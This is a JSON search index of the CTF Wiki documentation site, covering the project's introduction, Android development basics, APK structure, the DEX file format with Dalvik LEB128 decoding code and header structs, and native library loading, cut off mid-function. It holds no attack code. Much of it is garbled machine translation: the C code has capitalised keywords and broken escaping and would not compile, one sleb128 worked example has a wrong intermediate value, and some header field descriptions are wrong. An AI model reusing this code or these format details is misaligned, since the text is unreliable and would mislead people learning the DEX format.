{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Getting Started","text":"<p>Welcome to the CTF Wiki.</p> <p>CTF (Capture The Flag) is originated in the 1996 DEFCON Global Hacking Conference, a competitive game among cybersecurity enthusiasts.</p> <p>The CTF competition covers a wide range of fields and has a complex content. At the same time, the development of security technology is getting faster and faster, and the difficulty of CTF is getting higher and higher, the threshold for beginners is getting higher and higher. Most of the online information is scattered and trivial. Beginners often don't know how to systematically learn the knowledge of CTF related fields, often taking a lot of time and suffering.</p> <p>In order to make the CTF players life of entering this field easier, in October 2016, CTF Wiki had the first commit on Github. As content continues to improve, the CTF Wiki has been loved by more and more security enthusiasts, and there are also a lot of friends who have never met participating in this project.</p> <p>As a free site, with the recent years' CTF challenges, CTF Wiki introduces the knowledge and techniques in all directions of CTF to make it easier for beginners to learn how to getting started at playing CTF.</p> <p>At present, CTF Wiki mainly contains the basic knowledge of CTF in all major directions, and is working hard to improve the following contents.</p> <ul> <li>Advanced knowledge in the CTF competition</li> <li>Quality topics in the CTF competition</li> </ul> <p>For more information on the above, see the [Projects] (https://github.com/ctf-wiki/ctf-wiki/projects) of the CTF Wiki for a detailed list of what is being done and what to do.</p> <p>Of course, the CTF Wiki is based on CTF, but it is not limited to CTF. In the future, CTF Wiki will</p> <ul> <li>Introducing tools in security research area</li> <li>More integration with security area</li> </ul> <p>In addition, given the following two points</p> <ul> <li>Technology should be shared in an open manner.</li> <li>Security offensive and defensive technologies are always up to date, and old technologies may fail at any time in the face of new technologies.</li> </ul> <p>CTF Wiki will never publish books.</p> <p>Finally, the CTF Wiki originates from the community, as an independent organization, advocates freedom of knowledge, will never be commercialized in the future, and will always remain independent and freedom**.</p>"},{"location":"#how-to-build","title":"How to build\uff1f","text":"<p>This document is currently deployed at [https://ctf-wiki.github.io/ctf-wiki/] (https://ctf-wiki.github) using mkdocs .io/ctf-wiki/). Of course, it can also be deployed locally, as follows:</p> <pre><code># 1. clone\n\ngit clone git@github.com: ctf-wiki / ctf-wiki.git\n# 2. requirements\n\npip install -r requirements.txt\n\n# generate static file in site/\n\nmkdocs build\n\n# deploy at http://127.0.0.1:8000\n\nmkdocs serve\n</code></pre> <p>**mkdocs Locally deployed websites are dynamically updated, i.e. when you modify and save the md file, refreshing the page and the contents will be dynamically updated. **</p> <p>Just want to browse locally, don't want to modify the document? Try Docker! <pre><code>docker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki\n</code></pre></p> <p>You can then access the CTF Wiki by visiting [http://localhost:4100/] (http://localhost:4100/) in your browser.</p>"},{"location":"#how-to-practice","title":"How to practice\uff1f","text":"<p>First, you can learn some basic security knowledge by reading online.</p> <p>Second, the CTF Wiki has two accompany projects.</p> <ul> <li>The challenges mentioned in the CTF Wiki are in the [ctf-challenges] (https://github.com/ctf-wiki/ctf-challenges) repository, so look for them according to the corresponding category.</li> <li>Note: There are still some challenges that are currently being migrated. . . (misc, web)</li> <li>The tools involved in the CTF Wiki are constantly being added to the ctf-tools repository.</li> </ul>"},{"location":"android/readme/","title":"Android Security","text":""},{"location":"android/basic_develop/basic_develop/","title":"Android Development Fundamentals","text":"<p>Before doing Android security, we should understand the basic process of Android development as much as possible.</p>"},{"location":"android/basic_develop/basic_develop/#basic-knowledge","title":"Basic knowledge","text":"<p>Read the following books in order to learn about Android basic development knowledge from the shallower</p> <ul> <li>The first line of code, after reading the first seven chapters</li> <li>JNI/NDK development, there is currently no suitable guide available.</li> <li>The authoritative guide to Android programming (optional)</li> <li>Android Advanced Advanced (optional)</li> </ul> <p>In the process of learning, I feel that I need to focus on the following knowledge in Android development.</p> <ul> <li>Android system architecture</li> <li>Basic source file architecture</li> <li>Basic development methods and code writing conventions to understand the meaning of common code.</li> <li>Understand the file format of some configuration resources such as xml.</li> </ul> <p>** Be sure to set up a basic Android development environment! ! ! ! ! **</p> <ul> <li> <p>java</p> </li> <li> <p>ddms</p> </li> <li> <p>ndk</p> </li> <li>sdk, install several versions of sdk, 5.0-8.0</li> </ul>"},{"location":"android/basic_develop/basic_develop/#apk-packaging-process","title":"Apk Packaging Process","text":"<p>After writing the App-related code, our final step is to package all the resource files used in the App. The packaging process is as shown in the following figure ( http://androidsrc.net/android-app-build-overview/ ). :</p> <p></p> <p>The specific operation is as follows</p> <ol> <li>Use aapt ( The Android Asset Packing Tool ) to package the resource files to generate R.java files.</li> <li>If the service provided by AIDL (Android Interface Definition Language) is used in the project, you need to use the AIDL tool to parse the AIDL interface file to generate the corresponding Java code.</li> <li>Compile the R.java and AIDL files into a .class file using javac.</li> <li>Use the dx tool to convert class and third-party libraries to dex files.</li> <li>Use apkbuilder to package the first compiled resource, the .dex file generated in step 4, and some other resources into the APK file.</li> <li>This section mainly signs the APK. There are two cases. If we want to publish the app, we will use the RealeaseKeystore signature. Otherwise, if we just want to debug the app, we will use the debug.keystore signature.</li> <li>Before releasing the official version, we need to change the starting offset of the resource file in the APK package from the file to an integer multiple of 4 bytes, so that the speed will be faster when the App is run later.</li> </ol>"},{"location":"android/basic_develop/basic_develop/#apk-file-structure","title":"Apk file structure","text":"<p>The APK file is also a ZIP file. Therefore, we can decompress it using the tool that unpacks the zip. The structure of a typical APK file is shown below. Among them, the introduction of each part is as follows</p> <p></p> <ul> <li> <p>AndroidManifest.xml</p> </li> <li> <p>This file is mainly used to declare basic information such as the name, components, permissions of the application.</p> </li> <li> <p>class.dex</p> </li> <li> <p>This file is the executable file for the dalvik virtual machine and contains the executable code of the application.</p> </li> <li> <p>resource.arsc</p> </li> <li> <p>This file is mainly a binary resource compiled by the application and a mapping relationship between the resource location and the resource id, such as a string.</p> </li> <li> <p>assets</p> </li> <li> <p>This folder is typically used for the original resource files that contain the application, such as fonts and music files. This information can be obtained through the API while the program is running.</p> </li> <li> <p>lib/</p> </li> <li> <p>The lib directory is mainly used to store local library files used by the JNI (Java Native Interface) mechanism, and the corresponding subdirectories are created according to the supported architecture.</p> </li> <li>res /</li> <li>This directory mainly contains resources referenced by Android apps, and will be stored according to resource types, such as images, animations, menus, etc. There is also a value folder that contains various attribute resources.</li> <li>colors.xml--&gt;color resources</li> <li>dimens.xml---&gt;size resources</li> <li>strings---&gt;string resources</li> <li>styles.xml--&gt;style resources</li> <li>META-INF /</li> <li>Similar to JAR files, the APK file also contains the META-INF directory, which is used to store files such as code signatures, so that it can be used to ensure that APK files are not modified at will.</li> </ul>"},{"location":"android/basic_operating_mechanism/readme/","title":"Android application operation mechanism","text":"<p>This section focuses on the basic operating principles of Java layer code and Native layer code in Android.</p> <p>In general, when launching an app, Android first executes the creation of the Application class (specified in the AndroidManifest.xml file), then starts executing the Main Activity, and then executes the relevant code according to various logics.</p> <p>Note: The contents of this section may have the following problems</p> <ul> <li>Brief</li> <li>I don\u2019t understand</li> </ul> <p>If you find something you can add, feel free to add it at any time. Of course, this section will also be updated over time.</p>"},{"location":"android/basic_operating_mechanism/java_layer/readme/","title":"Android Java layer running mechanism","text":"<p>This section focuses on the operating mechanism of Java layer code in Android.</p> <ul> <li>Java virtual machine, from a macro perspective, the program execution flow to consider how Java code is executed.</li> <li>Smali code that considers how Java code corresponds to instructions in the J Java virtual machine from a microscopic perspective, the instruction level.</li> <li>Java layer executable, considering the specific format of the corresponding executable file of the Java virtual machine.</li> </ul>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/","title":"DEX file","text":""},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#basic-introduction","title":"basic introduction","text":"<p>Google has designed the corresponding executable file DEX (Dalvik eXecutable File) for Java code in Android, which is suitable for mobile platforms such as mobile phones with low memory and poor processor performance. Below, we will mainly introduce the format of the DEX file.</p>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-file-format","title":"DEX file format","text":""},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#data-type-definition","title":"Data type definition","text":"<p>Before we introduce the specific structure of the DEX file, let's take a look at some of the basic data types used in the DEX file.</p> Name Description byte 8-bit signed integer ubyte 8-bit unsigned integer short 16-bit signed integer in little endian ushort 16-bit unsigned integer in little endian int 32-bit signed integer in little endian uint 32-bit unsigned integer in little endian Long 64-bit signed integer in little endian ulong 64-bit unsigned integer in little endian sleb128 Signed LEB128, variable length (see below) uleb128 Unsigned LEB128, variable length (see below) uleb128p1 Unsigned LEB128 plus <code>1</code>, variable length (see below) <p>The reason why the variable length data type is used is because you want to minimize the footprint of the executable file. For example, if the length of a string is 5, then we only need one byte, but we don't I would like to use <code>u1</code> directly to define the corresponding type, as this will limit all string lengths to the corresponding range.</p> <p>Variable-length types are actually based on the LEB128 (Little-Endian Base) type and can be used to represent 32-bit int numbers, which are chosen according to the size of the number to be represented. As shown in the figure below, the highest bit of each byte indicates whether the next byte is used, 1 means use, 0 means not used. Therefore, each byte actually has only 7 valid bits to indicate the corresponding number. If there is a variable of type LEB128 that uses 5 bytes and the highest bit of the fifth byte is 1, then there is a problem.</p> <p></p> <p>The function of reading unsigned leb128 type in dalvik is as follows</p> <pre><code>DEX_INLINE int readUnsignedLeb128(const u1** pStream) {\n\nconst u1 * ptr = * pStream;\nInt result = *(ptr++); //take the first byte\nIf (result &amp;gt; 0x7f) { //If the first byte is greater than 0x7f, the highest byte of the first byte is 1\nInt cur = *(ptr++); //2nd byte\nResult = (result &amp;amp; 0x7f) | ((cur &amp;amp; 0x7f) &amp;lt;&amp;lt; 7); //The first two bytes\n        if (cur &gt; 0x7f) {\n\ncur = * (ptr ++);\n            result |= (cur &amp; 0x7f) &lt;&lt; 14;\n\n            if (cur &gt; 0x7f) {\n\ncur = * (ptr ++);\n                result |= (cur &amp; 0x7f) &lt;&lt; 21;\n\n                if (cur &gt; 0x7f) {\n\n                    /*\n\n                     * Note: We don't check to see if cur is out of\n\n                     * range here, meaning we tolerate garbage in the\n\n                     * high four-order bits.\n\n                     */\n\ncur = * (ptr ++);\n                    result |= cur &lt;&lt; 28;\n\n                }\n\n            }\n\n        }\n\n    }\n\n* pStream = ptr;\n    return result;\n\n}\n</code></pre> <p>For example, if we want to calculate the uleb128 value of c0 83 92 25, as follows</p> <ul> <li>The highest bit of the first byte is 1, so there is a second byte. Result1 = 0xc0 &amp; 0x7f=0x40</li> <li>Similarly, the second byte corresponds to result2 = (0x83 &amp; 0x7f)&lt;&lt;7 = 0x180</li> <li>The result of the third byte is result3 = (0x92 &amp; 0x7f) &lt;&lt;14 = 0x48000</li> <li>result4 of the fourth byte = (0x25)&lt;&lt;21 = 0x4a00000</li> <li>The value corresponding to this byte stream is result1+result2+result3+result4 = 0x4a481c0</li> </ul> <p>The number of signed LEB128 types in dalvik is as follows</p> <pre><code> DEX_INLINE int readSignedLeb128(const u1** pStream) {\n\nconst u1 * ptr = * pStream;\nint result = * (ptr ++);\n    if (result &lt;= 0x7f) {\n\nResult = (result &amp;lt;&amp;lt; 25) &amp;gt;&amp;gt; 25; //symbol expansion\n    } else {\n\nint cur = * (ptr ++);\n        result = (result &amp; 0x7f) | ((cur &amp; 0x7f) &lt;&lt; 7);\n\n        if (cur &lt;= 0x7f) {\n\nResult = (result &amp;lt;&amp;lt; 18) &amp;gt;&amp;gt; 18; //symbol expansion\n        } else {\n\ncur = * (ptr ++);\nResult |= (cur &amp;amp; 0x7f) &amp;lt;&amp;lt; 14; //symbol expansion\n            if (cur &lt;= 0x7f) {\n\nResult = (result &amp;lt;&amp;lt; 11) &amp;gt;&amp;gt; 11; //symbol expansion\n            } else {\n\ncur = * (ptr ++);\n                result |= (cur &amp; 0x7f) &lt;&lt; 21;\n\n                if (cur &lt;= 0x7f) {\n\nResult = (result &amp;lt;&amp;lt; 4) &amp;gt;&amp;gt; 4; //symbol expansion\n                } else {\n\n                    /*\n\n                     * Note: We don't check to see if cur is out of\n\n                     * range here, meaning we tolerate garbage in the\n\n                     * high four-order bits.\n\n                     */\n\ncur = * (ptr ++);\n                    result |= cur &lt;&lt; 28;\n\n                }\n\n            }\n\n        }\n\n    }\n\n* pStream = ptr;\n    return result;\n\n}\n</code></pre> <p>For example, if we want to calculate the sleb128 value of d1 c2 b3 40, the calculation process is as follows</p> <ul> <li> <p>result1 = 0xd1 &amp; 0x7f = 0x51</p> </li> <li> <p>result2 = (0xc2 &amp; 0x7f) &lt;&lt;7  = 0x21000</p> </li> <li> <p>result3 = (0xb3 &amp; 0x7f) &lt;&lt;14  =0xcc000</p> </li> <li> <p>result4 = (0x40)&lt;&lt; 21 = 0x8000000</p> </li> <li> <p>The final result (r1+r2+r3+r4)&lt;&lt; 4 &gt;&gt;4 = 0xf80ce151</p> </li> </ul> <p>The uleb128p1 type is mainly used to represent unsigned numbers, which is suitable for the following scenarios.</p> <ul> <li>Requires the representation of the number to be non-negative</li> <li>When the number is 0xffffffff, it is 0 by adding 1 to it. At this time, we only need 1 byte.</li> <li>** Need to think further. **</li> </ul>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-file-overview","title":"DEX File Overview","text":"<p>The overall structure of the DEX file is as follows</p> <p></p> <p>Mainly consists of three parts</p> <ul> <li>The file header gives the basic properties of the dex file.</li> <li>The index area, which gives an index of the relevant data, whose data is actually placed in the data area.</li> <li>Data area, storing the actual string, code.</li> </ul>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-file-header","title":"DEX file header","text":"<p>The file header of DEX mainly contains magic field, alder32 check value, SHA-1 hash value, number of string_ids and offset address, etc., which occupy 0x70 bytes, and the data structure is as follows:</p> <pre><code>struct DexHeader {\n\n    u1  magic[8];           /* includes version number */\n\n    u4  checksum;           /* adler32 checksum */\n\nu1 signature [kSHA1DigestLen]; / * SHA-1 hash * /\n    u4  fileSize;           /* length of entire file */\n\n    u4  headerSize;         /* offset to start of next section */\n\nU4 endianTag;\n    u4  linkSize;\n\n    u4  linkOff;\n\n    u4  mapOff;\n\n    u4  stringIdsSize;\n\n    u4  stringIdsOff;\n\n    u4  typeIdsSize;\n\nu4 typeIdsOff;\nu4 protoIdsSize;\nu4 protoIdsOff;\n    u4  fieldIdsSize;\n\n    u4  fieldIdsOff;\n\n    u4  methodIdsSize;\n\n    u4  methodIdsOff;\n\n    u4  classDefsSize;\n\n    u4  classDefsOff;\n\nu4 dataSize;\n    u4  dataOff;\n\n};\n</code></pre> <p>The specific description is as follows</p> Name Format Description Magic ubyte[8] = DEX_FILE_MAGIC Identifies the DEX file, where DEX_FILE_MAGIC =\"dex\\n035\\0\" Checksum uint The adler32 checksum of the rest of the files except <code>magic</code> and this field, used to detect file corruption signature ubyte[20] SHA-1 signature (hash) for the contents of files other than <code>magic</code>, <code>checksum</code> and this field, used to uniquely identify the file file_size uint The size of the entire file (including the file header) in bytes header_size uint = 0x70 The size of the file header, in bytes. Endian_tag uint = ENDIAN_CONSTANT Byte order mark, big endian or little endian. link_size uint If this file is not statically linked, the value is <code>0</code>, otherwise the size of the link section, link_off uint If <code>link_size == 0</code>, the value is <code>0</code>; otherwise, the offset is the offset from the beginning of the file to the <code>link_data</code> section. map_off uint The offset must be non-zero, identifying the offset from the beginning of the file to the <code>data</code> section. string_ids_size uint Number of strings in the list of string identifiers string_ids_off uint If <code>string_ids_size == 0</code> (which is undeniably a strange extreme case), the value is <code>0</code>; otherwise it represents the offset from the beginning of the file to <code>string_ids</code>. type_ids_size uint The number of elements in the type identifier list, up to 65535 type_ids_off uint If <code>type_ids_size == 0</code> (which is undeniably a strange extreme case), the value is <code>0</code>; otherwise it represents the offset from the beginning of the file to the beginning of the <code>type_ids</code> section. proto_ids_size uint Prototype (method) The number of elements in the list of identifiers, up to 65535 proto_ids_off uint If <code>proto_ids_size == 0</code> (which is undeniably a strange extreme case), the value is <code>0</code>; otherwise the offset represents the offset from the beginning of the file to the beginning of the <code>proto_ids</code> section the amount. field_ids_size uint Number of Elements in the Field Identifier List field_ids_off uint If <code>field_ids_size == 0</code>, the value is <code>0</code>; otherwise the offset represents the offset from the beginning of the file to the beginning of the <code>field_ids</code> section. method_ids_size uint Number of elements in the method identifier list method_ids_off uint If <code>method_ids_size == 0</code>, the value is <code>0</code>. The offset, on the other hand, represents the offset from the beginning of the file to the beginning of the <code>method_ids</code> section. class_defs_size uint Number of elements in the class definition list class_defs_off uint If <code>class_defs_size == 0</code> (which is undeniably a strange extreme case), the value is <code>0</code>; otherwise the offset represents the offset from the beginning of the file to the beginning of the <code>class_defs</code> section the amount. data_size uint The size of the <code>data</code> section in bytes, which must be an even multiple of sizeof(uint), indicating 8-byte alignment. data_off uint The offset from the beginning of the file to the beginning of the <code>data</code> section."},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-index-area","title":"DEX index area","text":""},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#string-id","title":"string id","text":"<p>The StringIds section contains the <code>stringIdsSize</code> <code>DexStringId</code> structure, which has the following structure:</p> <pre><code>struct DexStringId {\n\nU4 stringDataOff; /* String data offset, which is the file offset of each StringData in the data area */\n};\n</code></pre> <p>It can be seen that only the relative offset of each string is stored in DexStringId. In addition, each offset occupies 4 bytes, and the string portion occupies 4*stringIdsSize bytes in total.</p> <p>At the corresponding offset, the string is stored in the MUTF-8 format, which stores the variable of the LEB128 type we mentioned earlier, indicating the length of the string, followed by the string, followed by  End of x00, the length of the string does not contain \\x00.</p>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#type-id","title":"type id","text":"<p>The type_ids section indexes all the types (classes, arrays, or primitive types) used in the java code. This list must be sorted by the <code>string_id</code> index and cannot be repeated.</p> <pre><code>struct DexTypeId {\n\nU4 descriptorIdx; /* index to the list of DexStringIds*/\n};\n</code></pre>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#proto-id","title":"proto Id","text":"<p>The Proto id field is mainly designed for the method prototype in java. It mainly contains the return type and parameter list of a method declaration, which is not involved in the method name. It mainly contains the following three data structures</p> <pre><code>struct DexProtoId {\n\nU4 shortyIdx; /* return type + parameter type, shorthand, index to the list of DexStringId */\nU4 returnTypeIdx; /* return type, index to the DexTypeId list */\nU4 parametersOff; /* parameter type, offset to DexTypeList*/\n}\n\n\n\nstruct DexTypeList {\n\nU4 size; /* The number of DexTypeItems, that is, the number of parameters */\nDexTypeItem list[1]; /* points to the beginning of the DexTypeItem*/\n};\n\n\n\nstruct DexTypeItem {\n\nU2 typeIdx; /* parameter type, index to the list of DexTypeId, and finally point to the string index */\n};\n</code></pre>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#field-id","title":"field id","text":"<p>The field id area is mainly designed for the fields of each class in java, mainly related to the following data structure.</p> <pre><code>struct DexFieldId {\n\nU2 classIdx; /* The type of the class, pointing to the index of the DexTypeId list */\nU2 typeIdx; /* field type, index to the list of DexTypeIds*/U4 nameIdx; /* field name, index to the DexStringId list */\n};\n</code></pre>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#method-id","title":"method id","text":"<p>The method id area is designed directly for methods in java. It contains the class in which the method resides, the prototype of the method, and the name of the method.</p> <pre><code>struct DexMethodId {\n\nU2 classIdx; /* The type of the class, pointing to the index of the DexTypeId list */\nU2 protoIdx; /* declaration type, index to the DexProtoId list */\nU4 nameIdx; /* method name, index to the DexStringId list */\n};\n</code></pre>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#class-def","title":"class def","text":"<p>classDefsSize indicates the size of the class def area, and classDefsOff indicates the offset of the class def area.</p> <p>This area is designed for classes in java and contains the following data structures. The related information is as follows</p> <pre><code>// basic information about the class\nstruct DexClassDef {\n\nU4 classIdx; /* The type of the class, pointing to the index of the DexTypeId list */\nU4 accessFlags; /* access flag*/\nU4 superclassIdx; /* parent class type, index to the DexTypeId list */\nU4 interfacesOff; /* interface, offset to DexTypeList*/\nU4 sourceFileIdx; /* source file name, index to the DexStringId list */\nU4 annotationsOff; /* annotation, pointing to the DexAnnotationsDirectoryItem structure */\nU4 classDataOff; /* points to the offset of the DexClassData structure */\nU4 staticValuesOff; /* points to the offset of the DexEncodedArray structure */\n};\n\n\n\n// Overview of the fields and methods of the class\nstruct DexClassData {\n\nDexClassDataHeader header; /* Specify the number of fields and methods */\nDexField* staticFields; /* static field, DexField structure */\nDexField* instanceFields; /* instance field, DexField structure */\nDexMethod* directMethods; /* Direct method, DexMethod structure */\nDexMethod* virtualMethods; /* virtual method, DexMethod structure */\n\n\n/ / Detailed description of the number of fields and the number of methods\nstruct DexClassDataHeader {\n\nU4 staticFieldsSize; /* number of static fields */\nU4 instanceFieldsSize; /* number of instance fields */\nU4 directMethodsSize; /* number of direct methods */\nU4 virtualMethodsSize; /* number of virtual methods */\n};\n\n\n\n// field definition\nstruct DexField {\n\nU4 fieldIdx; /* index to DexFieldId*/\nU4 accessFlags; /* access flag*/\n};\n\n\n\n// method definition\nstruct DexMethod {\n\nU4 methodIdx; /* index to DexMethodId*/\nU4 accessFlags; /* access flag*/\nU4 codeOff; /* points to the offset of the DexCode structure */\n};\n\n\n\n// Code overview\nstruct DexCode {\n\nU2 registersSize; /* Number of registers used */\nU2 insSize; /* number of parameters */\nU2 outsSize; /* The number of registers used by other methods when calling other methods will be applied in their own call stack and pushed (guessed) */\nU2 triesSize; /* Try/Catch number*/\nU4 debugInfoOff; /* points to the offset of the debug information */\nU4 insnsSize; /* The number of instruction sets, in units of 2 bytes */\nU2 insns[1]; /* instruction set*/\n};\n</code></pre>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#summary","title":"Summary","text":"<p>It can be seen that pointing in the index area is more complicated, but at the same time it is also clever. Here is the Dalvik designer in the [Google Developer Day 2008 China] (https://sites.google.com/site/developerdaychina/) speech. Give an example.</p> <p></p>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-data-area","title":"DEX Data Area","text":"<p>What is stored here is the various data mentioned before.</p>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-map-section","title":"DEX map section","text":"<p>The mapOff field in DexHeader gives the offset of the DexMapList structure in the DEX file. When the Dalvik virtual machine parses the content of the DEX file, it maps the content to the DexMapList data structure. It can be said that the structure describes the overall profile of the corresponding DEX file. The specific code is as follows</p> <pre><code>struct DexMapList {\n\nU4 size; /* The number of DexMapItem, easy to parse */\nDexMapItem list[1]; /* points to DexMapItem */\n};\n\n\n\nstruct DexMapItem {\n\nU2 type; /* Type at the beginning of kDexType*/\nU2 unused; /* not used for byte alignment*/\nU4 size; /* specifies the number of corresponding types */\nU4 offset; /* specifies the file offset of the corresponding type of data */\n};\n\n\n\nThe /* type field is an enumeration constant, and it is easy to determine its specific type by type name. */\n/* map item type codes */\n\nenum {\n\n    kDexTypeHeaderItem               = 0x0000,\n\n    kDexTypeStringIdItem             = 0x0001,\n\n    kDexTypeTypeIdItem               = 0x0002,\n\n    kDexTypeProtoIdItem              = 0x0003,\n\n    kDexTypeFieldIdItem              = 0x0004,\n\n    kDexTypeMethodIdItem             = 0x0005,\n\n    kDexTypeClassDefItem             = 0x0006,\n\n    kDexTypeMapList                  = 0x1000,\n\n    kDexTypeTypeList                 = 0x1001,\n\n    kDexTypeAnnotationSetRefList     = 0x1002,\n\n    kDexTypeAnnotationSetItem        = 0x1003,\n\n    kDexTypeClassDataItem            = 0x2000,\n\n    kDexTypeCodeItem                 = 0x2001,\n\n    kDexTypeStringDataItem           = 0x2002,\n\n    kDexTypeDebugInfoItem            = 0x2003,\n\n    kDexTypeAnnotationItem           = 0x2004,\n\n    kDexTypeEncodedArrayItem         = 0x2005,\n\n    kDexTypeAnnotationsDirectoryItem = 0x2006,\n\n};\n</code></pre>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-instance","title":"DEX instance","text":"<p>Specifically, you can find an apk yourself, and then you can see the corresponding result by parsing the template of 010editor.</p>"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#reference-reading","title":"Reference reading","text":"<ul> <li>Android software security and reverse analysis</li> </ul>"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/","title":"ODEX file","text":""},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#basic-introduction","title":"basic introduction","text":"<p>We know that the code for the java layer of the Android application is in the class.dex file of the apk file. In general, we get the dex file and parse it every time we start the program. Obviously, every time we do this, the efficiency will be lower. Android developers have come up with a way to optimize dex files when they are initially loaded, and generate an ODEX file, which is stored in the /data/dalvik-cache directory. When running this program again later, we only need to load the optimized ODEX file directly, eliminating the need to optimize each time. For the Android ROM's own app, it is directly converted to an odex file and stored in the same directory as the apk, so that when the phone is turned on every time, it will be much faster.</p>"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#basic-structure","title":"basic structure","text":"<p>To be added.</p>"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#generation-process","title":"Generation process","text":"<p>To be added.</p>"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#_1","title":"\u53c2\u8003\u9605\u8bfb","text":"<ul> <li>Android software security and reverse analysis</li> </ul>"},{"location":"android/basic_operating_mechanism/native_layer/so/","title":"so Introduction","text":""},{"location":"android/basic_operating_mechanism/native_layer/so/#basic-introduction","title":"basic introduction","text":"<ul> <li>Why use Shared Object(SO)</li> <li>Development efficiency</li> <li>Fast migration</li> <li>the version of so</li> <li>Different depending on the CPU platform</li> </ul>"},{"location":"android/basic_operating_mechanism/native_layer/so/#loading-method","title":"Loading method","text":"<ul> <li> <p>System.loadLibrary</p> </li> <li> <p>If the loaded file name is xxx, then the libxxx.so file in the libs directory of the project is actually loaded.</p> </li> <li> <p>System.load </p> </li> <li> <p>Corresponds to the absolute path of lib.</p> </li> </ul> <p>The first method is mainly used, and the second method is mainly used to load the so file in the plugin.</p>"},{"location":"android/basic_operating_mechanism/native_layer/so/#loadlibrary-loading-process","title":"loadLibrary Loading Process","text":"<p>According to the official API</p> <p>The call <code>System.loadLibrary(name)</code> is effectively equivalent to the call</p> <pre><code> Runtime.getRuntime().loadLibrary(name)\n</code></pre> <p>It can be seen that the function actually calls the function loadLibrary in Runtime.java ( <code>libcore/luni/src/main/java/java/lang/Runtime.java</code> ), and then continues to call loadLibrary another overloaded function. Contains two parameters</p> <ul> <li>libame, the library name we passed in</li> <li>VMStack.getCallingClassLoader(), the class loader ClassLoader, is convenient for finding the corresponding library.</li> </ul> <pre><code>    /**\n\n     * Loads and links the library with the specified name. The mapping of the\n\n     * specified library name to the full path for loading the library is\n\n     * implementation-dependent.\n\n     *\n\n     * @param libName\n\n     *            the name of the library to load.\n\n     * @throws UnsatisfiedLinkError\n\n     *             if the library can not be loaded.\n\n     */\n\n    public void loadLibrary(String libName) {\n\n        loadLibrary(libName, VMStack.getCallingClassLoader());\n\n    }\n\n    /*\n\n     * Searches for a library, then loads and links it without security checks.\n\n     */\n\n    void loadLibrary(String libraryName, ClassLoader loader) {\n\n        if (loader != null) {\n\n            String filename = loader.findLibrary(libraryName);\n\n            if (filename == null) {\n\n                throw new UnsatisfiedLinkError(\"Couldn't load \" + libraryName +\n\n                                               \" from loader \" + loader +\n\n                                               \": findLibrary returned null\");\n\n            }\n\n            String error = doLoad(filename, loader);\n\n            if (error != null) {\n\n                throw new UnsatisfiedLinkError(error);\n\n            }\n\n            return;\n\n        }\n\n        String filename = System.mapLibraryName(libraryName);\n\n        List&lt;String&gt; candidates = new ArrayList&lt;String&gt;();\n\n        String lastError = null;\n\n        for (String directory : mLibPaths) {\n\n            String candidate = directory + filename;\n\n            candidates.add(candidate);\n\n            if (IoUtils.canOpenReadOnly(candidate)) {\n\n                String error = doLoad(candidate, loader);\n\n                if (error == null) {\n\n                    return; // We successfully loaded the library. Job done.\n\n                }\n\n                lastError = error;\n\n            }\n\n        }\n\n        if (lastError != null) {\n\n            throw new UnsatisfiedLinkError(lastError);\n\n        }\n\n        throw new UnsatisfiedLinkError(\"Library \" + libraryName + \" not found; tried \" + candidates);\n\n    }\n</code></pre> <p>It can be seen that the main function of the program is as explained in the comments.</p> <p>Searches for a library, then loads and links it without security checks.</p> <p>The load function used in it is the doLoad function. Here, let's not continue the analysis, let's take a look at the load function.</p>"},{"location":"android/basic_operating_mechanism/native_layer/so/#load-loading-process","title":"load Loading process","text":"<p>According to the official API description, as follows</p> <p>The call System.load(name) is effectively equivalent to the call:</p> <p>```java</p> <p>&gt; Runtime.getRuntime (). Load (name)</p> <p>```</p> <p>It is also a function called Runtime.java, as follows</p> <pre><code>    /**\n\n     * Loads and links the dynamic library that is identified through the\n\n     * specified path. This method is similar to {@link #loadLibrary(String)},\n\n     * but it accepts a full path specification whereas {@code loadLibrary} just\n\n     * accepts the name of the library to load.\n\n     *\n\n     * @param pathName\n\n     *            the absolute (platform dependent) path to the library to load.\n\n     * @throws UnsatisfiedLinkError\n\n     *             if the library can not be loaded.\n\n     */\n\n    public void load(String pathName) {\n\n        load(pathName, VMStack.getCallingClassLoader());\n\n    }\n\n    /*\n\n     * Loads and links the given library without security checks.\n\n     */\n\n    void load(String pathName, ClassLoader loader) {\n\n        if (pathName == null) {\n\n            throw new NullPointerException(\"pathName == null\");\n\n        }\n\n        String error = doLoad(pathName, loader);\n        if (error != null) {\n\n            throw new UnsatisfiedLinkError(error);\n\n        }\n\n    }\n</code></pre> <p>It also calls the overloaded function of the two parameters of load, which in turn calls the doLoad function.</p> <p>** Regardless of which of the above loading methods, the doLoad function in Runtime.java will be called. **</p>"},{"location":"android/basic_operating_mechanism/native_layer/so/#core-loading-process","title":"Core loading process","text":""},{"location":"android/basic_operating_mechanism/native_layer/so/#doload","title":"doLoad","text":"<p>Let's analyze the doLoad function as follows</p> <pre><code>    private String doLoad(String name, ClassLoader loader) {\n\n        // Android apps are forked from the zygote, so they can't have a custom LD_LIBRARY_PATH,\n\n        // which means that by default an app's shared library directory isn't on LD_LIBRARY_PATH.\n\n        // The PathClassLoader set up by frameworks/base knows the 